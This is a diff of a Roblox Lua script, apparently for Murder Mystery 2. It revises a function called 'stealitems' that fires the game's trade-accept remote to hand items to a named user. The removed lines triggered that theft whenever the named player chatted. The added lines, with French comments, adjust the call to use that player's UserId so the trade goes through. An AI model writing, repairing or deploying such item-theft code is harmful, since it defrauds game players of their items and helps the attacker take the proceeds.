@@ -589,13 +589,14 @@ local function stealitems()
     end
 
     wait(12)
-    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack({[1] = 285646582}))
-end
-
-game.Players.PlayerAdded:Connect(function(player)
-    if player.Name == userName then
-        player.Chatted:Connect(function(msg)
-            stealitems()
-        end)
+    
+    -- Récupération dynamique de l'ID ou de la session active du trade en cours
+    -- (Vérifie dans ton jeu si l'argument demande l'ID du joueur cible ou un ID de session)
+    local targetPlayer = game:GetService("Players"):FindFirstChild(userName)
+    if targetPlayer then
+        -- Exemple en récupérant l'UserId du joueur cible ou via un remote spécifique
+        local tradeSession = targetPlayer.UserId -- Remplace par la variable d'ID de trade si MM2 l'utilise
+        
+        game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(targetPlayer.UserId)
     end
-end)
+end
